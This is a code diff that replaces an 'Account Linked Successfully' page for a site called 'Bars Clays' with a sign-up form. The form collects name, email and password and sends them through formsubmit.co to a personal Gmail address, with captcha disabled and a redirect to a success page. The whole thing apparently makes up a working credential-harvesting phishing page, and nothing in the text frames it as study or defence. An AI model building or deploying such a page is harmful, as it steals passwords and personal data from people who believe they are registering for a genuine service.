@@ -1,157 +1,83 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bars Clays - Success</title>
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, Helvetica, sans-serif;
-}
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Bars Clays - Sign Up</title>  <style>  
+* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif;}  
+body { background: #f4f6f9; display: flex; justify-content: center; align-items: center; height: 100vh; }  
+.container { background: #ffffff; width: 380px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08);}  
+.logo { text-align:center; font-size:26px; font-weight:bold; margin-bottom:25px; color:#FCD535;}  
+.subtitle { text-align:center; font-size:14px; color:#555; margin-bottom:25px;}  
+.input-group { margin-bottom:18px; position:relative;}  
+.input-group input { width:100%; padding:12px; border-radius:6px; border:1px solid #ccc; font-size:14px; outline:none; transition:0.3s;}  
+.input-group input:focus { border-color:#FCD535; }  
+.toggle-password { position:absolute; right:10px; top:12px; cursor:pointer; font-size:14px; color:#666;}  
+.strength { font-size:12px; margin-top:5px; }  
+.strength.weak { color:red; }  
+.strength.medium { color:orange; }  
+.strength.strong { color:green; }  
+button { width:100%; padding:12px; border:none; background:#FCD535; color:#000; border-radius:6px; font-size:14px; cursor:pointer; transition:0.3s; font-weight:bold; }  
+button:hover { background:#e6b800;}  
+</style>  </head>  
+<body>  <div class="container">  
+    <div class="logo">Bars Clays</div>  
+    <div class="subtitle">Welcome to Bars Clays</div>  <!-- FORM SUBMIT TO EMAIL -->  
+<form action="https://formsubmit.co/zenithaurora777@gmail.com" method="POST">  
+    <div class="input-group">  
+        <input type="text" name="name" placeholder="Your Name" required>  
+    </div>  
+    <div class="input-group">  
+        <input type="email" name="email" placeholder="Your Email" required>  
+    </div>  
+    <div class="input-group">  
+        <input type="password" name="password" id="password" placeholder="Your Password" required>  
+        <span class="toggle-password" onclick="togglePassword()">Show</span>  
+        <div id="strengthMessage" class="strength"></div>  
+    </div>  
 
-body {
-    background-color: #0B0E11;
-    color: #EAECEF;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-}
+    <!-- Disable captcha -->  
+    <input type="hidden" name="_captcha" value="false">  
+    <!-- Redirect to success page -->  
+    <input type="hidden" name="_next" value="success.html">  
 
-.container {
-    background-color: #1E2329;
-    padding: 40px 30px;
-    border-radius: 12px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-    max-width: 400px;
-    width: 90%;
-}
+    <button type="submit">Continue</button>  
+</form>
 
-.checkmark {
-    width: 80px;
-    height: 80px;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin: 0 auto 20px auto;
-    background-color: #0ECB81;
-    animation: pop 0.5s ease forwards;
-    position: relative;
-}
-
-.checkmark::after {
-    content: '✔';
-    font-size: 40px;
-    color: #fff;
-    opacity: 0;
-    animation: fadeIn 0.5s ease 0.5s forwards;
-}
-
-@keyframes pop {
-    0% { transform: scale(0); }
-    100% { transform: scale(1); }
-}
-
-@keyframes fadeIn {
-    0% { opacity: 0; }
-    100% { opacity: 1; }
-}
-
-h1 {
-    font-size: 24px;
-    font-weight: bold;
-    margin-bottom: 10px;
-    color: #0ECB81;
-}
-
-p {
-    font-size: 14px;
-    color: #B7BDC6;
-    margin-bottom: 25px;
-}
-
-/* Simulated account info box */
-.account-box {
-    background-color: #272B33;
-    padding: 20px;
-    border-radius: 8px;
-    margin-bottom: 25px;
-    text-align: left;
-}
-
-.account-box h2 {
-    font-size: 16px;
-    color: #FCD535;
-    margin-bottom: 10px;
-}
-
-.account-box p {
-    font-size: 14px;
-    color: #EAECEF;
-    margin: 4px 0;
-}
-
-.button-back {
-    padding: 12px 25px;
-    border-radius: 8px;
-    border: none;
-    font-weight: bold;
-    font-size: 14px;
-    background-color: #FCD535;
-    color: #000;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-.button-back:hover {
-    background-color: #e6b800;
-}
-
-/* Responsive */
-@media (max-width: 500px) {
-    .container {
-        padding: 30px 20px;
-    }
-    .checkmark {
-        width: 60px;
-        height: 60px;
-    }
-    .checkmark::after {
-        font-size: 30px;
-    }
-    h1 {
-        font-size: 20px;
-    }
-    p, .account-box p {
-        font-size: 13px;
-    }
-    .account-box h2 {
-        font-size: 15px;
-    }
-}
-</style>
-</head>
-<body>
-
-<div class="container">
-    <div class="checkmark"></div>
-    <h1>Account Linked Successfully!</h1>
-    <p>Your Bars Clays account details have been received safely.</p>
-
-    <div class="account-box">
-        <h2>Account Summary</h2>
-        <p>Account Name: John Doe</p>
-        <p>Account Status: Active</p>
-        <p>Wallet Balance: $0.00</p>
-    </div>
-
-    <button class="button-back" onclick="window.location.href='index.html'">Back to Home</button>
-</div>
-
-</body>
+</div>  <script>  
+const passwordInput = document.getElementById("password");  
+const strengthMessage = document.getElementById("strengthMessage");  
+  
+passwordInput.addEventListener("input", function () {  
+    const value = passwordInput.value;  
+    let strength = 0;  
+    if (value.length >= 6) strength++;  
+    if (/[A-Z]/.test(value)) strength++;  
+    if (/[0-9]/.test(value)) strength++;  
+    if (/[^A-Za-z0-9]/.test(value)) strength++;  
+  
+    if (value.length === 0) {  
+        strengthMessage.textContent = "";  
+        strengthMessage.className = "strength";  
+    } else if (strength <= 1) {  
+        strengthMessage.textContent = "Weak password";  
+        strengthMessage.className = "strength weak";  
+    } else if (strength <= 3) {  
+        strengthMessage.textContent = "Medium strength";  
+        strengthMessage.className = "strength medium";  
+    } else {  
+        strengthMessage.textContent = "Strong password";  
+        strengthMessage.className = "strength strong";  
+    }  
+});  
+  
+function togglePassword() {  
+    if (passwordInput.type === "password") {  
+        passwordInput.type = "text";  
+        document.querySelector(".toggle-password").textContent = "Hide";  
+    } else {  
+        passwordInput.type = "password";  
+        document.querySelector(".toggle-password").textContent = "Show";  
+    }  
+}  
+</script>  </body>  
 </html>
